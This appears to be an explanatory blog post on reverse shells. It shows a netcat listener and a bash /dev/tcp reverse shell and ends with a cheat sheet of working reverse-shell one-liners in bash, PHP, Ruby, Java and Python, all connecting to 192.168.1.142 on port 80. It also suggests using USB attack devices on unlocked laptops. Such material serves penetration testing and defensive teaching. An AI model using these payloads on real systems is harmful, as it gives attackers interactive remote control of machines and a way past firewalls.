![](https://www.offensive-security.com/wp-content/uploads/2016/03/using-exploits.png)

Whats a reverse shell? 

Not quite but, you aren’t alone in ignorance. It is surprising that the number of folks that don’t actually know what a reverse shell is. Long story short, it is when one computer connects to another computer but the initiating computer forwards their shell to the destination. It is commonplace that a reverse shell happens during an attack or as part of a pentest. They are scary attacks because it gives an attacker an interactive shell on a machine that they should not have had access to inside of the “hardened” area.

- Lets break down how this works. 
First there is a machine listening somewhere on a specific tcp port. In this case using netcat.

```bash
$ nc -vlp 80 
-v, — verbose Set verbosity level (can be used several times); 
-l, — listen Bind and listen for incoming connections; 
-p, — source-port port Specify source port to use 
(http://man7.org/linux/man-pages/man1/ncat.1.html) 
```
Simple enough, just a listener on a specific port. Second, we will need another machine, the victim, to connect to this machine and then forward the session to it. There are countless ways to setup this connection depending what resources are available. This is how to do it with bash


```bash
$ bash -i >& /dev/tcp/192.168.1.142/80 0>&1
```
The command *bash -i >&* invokes bash with an “interactive” option. Then */dev/tcp/192.168.1.142/7023* redirects that session to a tcp socket via device file. 
Finally *0>&1* Takes standard output, and connects it to standard input.

It turns out linux has built a */dev/tcp* device file. While powerful and useful this file can be extremely dangerous when used in this way. This built in device file lets bash connect directly to any ip and any port out there. This also works well if you want to confirm a port is open, or check the time.

```bash
$ echo > /dev/tcp/192.168.1.142/22 
-bash: connect: Connection refused. ( yey no ssh is open !)

$ echo > /dev/tcp/www.google.com/80

$ cat </dev/tcp/time.nist.gov/13

57991 17-08-26 13:39:06 50 0 0   0.0 UTC(NIST) *
```

What’s so scary about this? Well, netcat can be listening on any port, and in the example it listened on port 80. This means that the connection and all the traffic flowing through that pipe is going to look like regular http traffic and if that port is open on one of your hosts (as it usually is) then it doesn’t matter what kind of firewall you have, it isn’t going to stop a reverse shell from owning you. Subsequently it doesn’t stop a machine from inside your firewall that has access to the internet **cough**cough laptops, from using the allowable port, and then pivoting to anything that can be accessible on the internal lan.

Reverse shells are really fun to play with especially if you have something like a rubber ducky or a bash bunny. That lets you walk up to an unsecured laptop (that you have legitimate access to of course) and snag a shell. Then wait for your victim to come back and…

```bash
$ say “im sorry dave i can’t let you do that, you should have locked your computer"
$ sudo reboot
```
Finally, here are examples of allowing a shell through in a whole bunch of different languages, because well not everything has bash, just most of the things.

```bash
Bash
exec 5<>/dev/tcp/192.168.1.142/80
cat <&5 | while read line; do $line 2>&5 >&5; done 
# or:
while read line 0<&5; do $line 2>&5 >&5; done

PHP
php -r ‘$sock=fsockopen(“192.168.1.142”,80);exec(“/bin/sh -i <&3 >&3 2>&3”);’
(Assumes TCP uses file descriptor 3. If it doesn’t work, try 4,5, or 6)

RUBY
ruby -rsocket -e’f=TCPSocket.open(“192.168.1.142”,80).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’

JAVA
r = Runtime.getRuntime()
p = r.exec([“/bin/bash”,”-c”,”exec 5<>/dev/tcp/192.168.1.142/80;cat <&5 | while read line; do \$line 2>&5 >&5; done”] as String[])
p.waitFor()

PYTHON
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.142”,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
```







